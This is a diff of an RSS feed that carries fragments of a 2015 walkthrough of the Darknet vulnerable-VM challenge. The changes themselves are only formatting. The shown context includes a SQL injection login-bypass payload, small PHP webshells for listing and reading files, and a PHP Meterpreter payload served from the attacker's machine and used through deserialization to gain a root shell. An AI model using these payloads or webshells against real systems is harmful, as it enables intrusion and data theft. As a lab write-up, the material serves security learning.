@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Darknet on rastamouse.me</title>
-    <link>https://rastamouse.me/tags/darknet/</link>
-    <description>Recent content in Darknet on rastamouse.me</description>
+    <title>darknet on rastamouse.me</title>
+    <link>https://rastamouse.me/tags/darknet/index.xml</link>
+    <description>Recent content in darknet on rastamouse.me</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 09 Jun 2015 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://rastamouse.me/tags/darknet/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
@@ -15,11 +14,11 @@
       <pubDate>Tue, 09 Jun 2015 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2015/the-darkside-of-darknet/</guid>
-      <description>
+      <description>&lt;p&gt;It was coming up to the date of my SANS GWAPT exam when Darknet landed, which meant I couldn&amp;rsquo;t spend much time on it.  Since passing that exam, Darknet became my new evening activity.&lt;/p&gt;
 
-&lt;p&gt;It was coming up to the date of my SANS GWAPT exam when Darknet landed, which meant I couldn&amp;rsquo;t spend much time on it.  Since passing that exam, Darknet became my new evening activity.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;port-scan:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Port Scan&lt;/h2&gt;
+&lt;h2 id=&#34;port-scan&#34;&gt;Port Scan&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;PORT      STATE SERVICE VERSION
 80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
@@ -40,7 +39,7 @@
 |_  100024  1          58932/tcp  status
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;a-bit-of-fuzzing:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;A Bit of Fuzzing&lt;/h2&gt;
+&lt;h2 id=&#34;a-bit-of-fuzzing&#34;&gt;A Bit of Fuzzing&lt;/h2&gt;
 
 &lt;div align=&#34;center&#34;&gt;
 	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
@@ -96,7 +95,7 @@ ID	Response   Lines      Word         Chars          Request
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;sqli-much:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;SQLi much?&lt;/h2&gt;
+&lt;h2 id=&#34;sqli-much&#34;&gt;SQLi much?&lt;/h2&gt;
 
 &lt;p&gt;This form seems to be vulnerable to SQL Injection, as entering a single quote in each field gives the following error:  &lt;code&gt;unrecognized token: &amp;quot;3590cb8af0bbb9e78c343b52b93773c9&amp;quot;&lt;/code&gt;.  This &amp;lsquo;token&amp;rsquo; is the MD5 sum of the &lt;code&gt;&#39;&lt;/code&gt; character (which tells us the form is MD5&amp;rsquo;ing the password before submission).  There also seems to be basic keyword filtering, as entering phrases such as &lt;code&gt;select&lt;/code&gt; or &lt;code&gt;=&lt;/code&gt; in the &lt;code&gt;username&lt;/code&gt; field produces an &lt;code&gt;Illegal&lt;/code&gt; message.&lt;/p&gt;
 
@@ -104,7 +103,7 @@ ID	Response   Lines      Word         Chars          Request
 
 &lt;p&gt;I was able to bypass this login page by replacing the &lt;code&gt;=&lt;/code&gt; operator with &lt;code&gt;IS&lt;/code&gt;:  &lt;code&gt;username=devnull&#39; or &#39;a&#39; is &#39;a&amp;amp;password=rasta&amp;amp;action=Login&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;sql-admin:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;SQL Admin&lt;/h2&gt;
+&lt;h2 id=&#34;sql-admin&#34;&gt;SQL Admin&lt;/h2&gt;
 
 &lt;div align=&#34;center&#34;&gt;
 	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
@@ -151,12 +150,12 @@ open_basedir: /etc/apache2:/home/devnull:/tmp
 
 &lt;p&gt;These disabled functions are going to make it a right pain to do anything.  To do more enumeration, I uploaded 2 more files: &lt;code&gt;dir.php&lt;/code&gt; and &lt;code&gt;file.php&lt;/code&gt;, which allowed me to view and read parts of the file system.&lt;/p&gt;
 
-&lt;h4 id=&#34;dir-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;dir.php&lt;/h4&gt;
+&lt;h4 id=&#34;dir-php&#34;&gt;dir.php&lt;/h4&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php echo &#39;&amp;lt;pre&amp;gt;&#39;; print_r(scandir($_REQUEST[&#39;dir&#39;])); echo &#39;&amp;lt;/pre&amp;gt;&#39;; ?&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h4 id=&#34;file-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;file.php&lt;/h4&gt;
+&lt;h4 id=&#34;file-php&#34;&gt;file.php&lt;/h4&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php $file = fopen($_REQUEST[&#39;file’],’r&#39;); while(! feof($file)) { echo fgets($file). &#39;&amp;lt;br /&amp;gt;&#39;; } fclose($file); ?&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
@@ -211,7 +210,7 @@ DocumentRoot /home/errorlevel/public_html
 AllowOverride All
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;signal8:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Signal8&lt;/h2&gt;
+&lt;h2 id=&#34;signal8&#34;&gt;Signal8&lt;/h2&gt;
 
 &lt;p&gt;Next, we can head on over to &lt;code&gt;signal8.darknet.com&lt;/code&gt; and we find another new page.&lt;/p&gt;
 
@@ -256,7 +255,7 @@ AllowOverride All
 
 &lt;p&gt;&lt;em&gt;&amp;hellip; Fast forward many hours of Googling&amp;hellip;&lt;/em&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;xml-injection:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;XML Injection&lt;/h2&gt;
+&lt;h2 id=&#34;xml-injection&#34;&gt;XML Injection&lt;/h2&gt;
 
 &lt;p&gt;I spent a lot of time reading up on how you could call and parse XML with PHP.  In my mind, I came up with something like this:&lt;/p&gt;
 
@@ -308,7 +307,7 @@ tc65Igkq6DF
 j4tC1P9aqmY
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;ploy:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Ploy&lt;/h2&gt;
+&lt;h2 id=&#34;ploy&#34;&gt;Ploy&lt;/h2&gt;
 
 &lt;p&gt;After using one of the username/password combo&amp;rsquo;s to login, you are taken to another page, with a single link.&lt;/p&gt;
 
@@ -375,7 +374,7 @@ j4tC1P9aqmY
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;subida-exitosa:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Subida Exitosa!&lt;/h2&gt;
+&lt;h2 id=&#34;subida-exitosa&#34;&gt;Subida Exitosa!&lt;/h2&gt;
 
 &lt;p&gt;My test file uploaded successfully and going back to the HTTP request, I can see the correct PIN was &lt;code&gt;37 10 59 17&lt;/code&gt;.  But now I also have to find the uploaded file.  More directory fuzzing within &lt;code&gt;xpanel&lt;/code&gt; reveals an &lt;code&gt;upload&lt;/code&gt; directory.&lt;/p&gt;
 
@@ -437,7 +436,7 @@ Server username: errorlevel (1002)
 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;the-final-dark-hurdle:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;The Final Dark Hurdle&lt;/h2&gt;
+&lt;h2 id=&#34;the-final-dark-hurdle&#34;&gt;The Final Dark Hurdle&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
 Listing: /var/www
@@ -460,7 +459,7 @@ Mode              Size  Type  Last modified              Name
 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h4 id=&#34;sec-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;sec.php&lt;/h4&gt;
+&lt;h4 id=&#34;sec-php&#34;&gt;sec.php&lt;/h4&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
 &amp;lt;?php
@@ -477,7 +476,7 @@ if(!empty($_POST[&#39;test&#39;])){
 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h4 id=&#34;test-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Test.php&lt;/h4&gt;
+&lt;h4 id=&#34;test-php&#34;&gt;Test.php&lt;/h4&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
 &amp;lt;?php
@@ -529,7 +528,7 @@ class Show {
 
 &lt;p&gt;I generated placed a PHP Meterpreter payload into my &lt;code&gt;/var/www&lt;/code&gt; folder, named it &lt;code&gt;root&lt;/code&gt; and started &lt;code&gt;apache2&lt;/code&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;serialization:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Serialization&lt;/h2&gt;
+&lt;h2 id=&#34;serialization&#34;&gt;Serialization&lt;/h2&gt;
 
 &lt;p&gt;First checked my serialization was working, using the &lt;code&gt;Show&lt;/code&gt; class.&lt;/p&gt;
 
@@ -649,8 +648,7 @@ meterpreter &amp;gt; cat /root/flag.txt
 
 #Twitter: @SecSignal, @q3rv0
 
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
   </channel>
